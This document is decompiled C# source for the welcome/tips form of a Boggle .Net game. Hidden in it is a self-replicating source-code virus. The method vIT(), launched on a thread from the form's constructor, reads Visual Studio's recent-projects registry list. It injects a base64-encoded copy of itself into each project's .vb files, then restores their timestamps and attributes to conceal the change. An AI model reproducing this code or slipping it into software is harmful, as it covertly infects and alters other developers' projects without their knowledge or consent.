using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class frmWelcome : Form
{
	[AccessedThroughProperty("btnOk")]
	private Button _btnOk;

	[AccessedThroughProperty("chkMain")]
	private CheckBox _chkMain;

	[AccessedThroughProperty("txtMain")]
	private RichTextBox _txtMain;

	private IContainer components;

	internal virtual CheckBox chkMain
	{
		get
		{
			return _chkMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_chkMain == null)
			{
			}
			_chkMain = value;
			if (_chkMain != null)
			{
			}
		}
	}

	internal virtual Button btnOk
	{
		get
		{
			return _btnOk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnOk != null)
			{
				((Control)_btnOk).remove_Click((EventHandler)btnOk_Click);
			}
			_btnOk = value;
			if (_btnOk != null)
			{
				((Control)_btnOk).add_Click((EventHandler)btnOk_Click);
			}
		}
	}

	internal virtual RichTextBox txtMain
	{
		get
		{
			return _txtMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			if (_txtMain != null)
			{
				((Control)_txtMain).remove_MouseDown(new MouseEventHandler(txtMain_MouseDown));
			}
			_txtMain = value;
			if (_txtMain != null)
			{
				((Control)_txtMain).add_MouseDown(new MouseEventHandler(txtMain_MouseDown));
			}
		}
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public frmWelcome()
	{
		((Form)this).add_Load((EventHandler)frmWelcome_Load);
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		if (disposing && components != null)
		{
			components.Dispose();
		}
		if (chkMain.get_Checked())
		{
			OleDbCommand val = new OleDbCommand("Update ShowWelcome Set ShowForm = 1", modGlobal.conBoggle);
			modGlobal.conBoggle.Open();
			val.ExecuteNonQuery();
			modGlobal.conBoggle.Close();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		txtMain = new RichTextBox();
		chkMain = new CheckBox();
		btnOk = new Button();
		((Control)this).SuspendLayout();
		((TextBoxBase)txtMain).set_BackColor(Color.Black);
		txtMain.set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		txtMain.set_ForeColor(Color.DodgerBlue);
		RichTextBox obj = txtMain;
		Point location = new Point(16, 16);
		((Control)obj).set_Location(location);
		((Control)txtMain).set_Name("txtMain");
		RichTextBox obj2 = txtMain;
		Size size = new Size(568, 160);
		((Control)obj2).set_Size(size);
		((Control)txtMain).set_TabIndex(0);
		txtMain.set_Text("");
		((Control)chkMain).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)chkMain).set_ForeColor(Color.Black);
		CheckBox obj3 = chkMain;
		location = new Point(424, 184);
		((Control)obj3).set_Location(location);
		((Control)chkMain).set_Name("chkMain");
		CheckBox obj4 = chkMain;
		size = new Size(160, 21);
		((Control)obj4).set_Size(size);
		((Control)chkMain).set_TabIndex(0);
		((Control)chkMain).set_Text("Don't Show Tips Again");
		Button obj5 = btnOk;
		location = new Point(17, 180);
		((Control)obj5).set_Location(location);
		((Control)btnOk).set_Name("btnOk");
		Button obj6 = btnOk;
		size = new Size(78, 24);
		((Control)obj6).set_Size(size);
		((Control)btnOk).set_TabIndex(0);
		((Control)btnOk).set_Text("OK");
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		((Form)this).set_BackColor(Color.DarkGray);
		size = new Size(600, 209);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[3]
		{
			(Control)btnOk,
			(Control)chkMain,
			(Control)txtMain
		});
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmWelcome");
		((Control)this).set_Text("Welcome To Boggle .Net");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
	}

	private void frmWelcome_Load(object sender, EventArgs e)
	{
		checked
		{
			((Control)this).set_Left((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Width / 2.0 - (double)((Control)this).get_Width() / 2.0));
			((Control)this).set_Top((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Height / 2.0 - (double)((Control)this).get_Height() / 2.0));
			txtMain.set_Text("\r\n   Welcom to Boggle .Net! Enjoy these helpful tips before starting your game:\r\n\r\n   Tip1: Click on the letter cubes during the game to assist in finding words.\r\n   Tip2: Click on the words found by the computer to display the letter combinations.\r\n   Tip3: Enable defenition search to query word defenitions from the internet.\r\n   Tip4: Choose a skill level and timer level the is challenging for you.\r\n   Tip5: Enable word validation to enrich the challenge.\r\n   Tip6: Have fun!");
		}
	}

	private void txtMain_MouseDown(object sender, MouseEventArgs e)
	{
		((Control)btnOk).Focus();
	}

	private void btnOk_Click(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Application.DoEvents();
		((Component)(object)this).Dispose();
	}
}
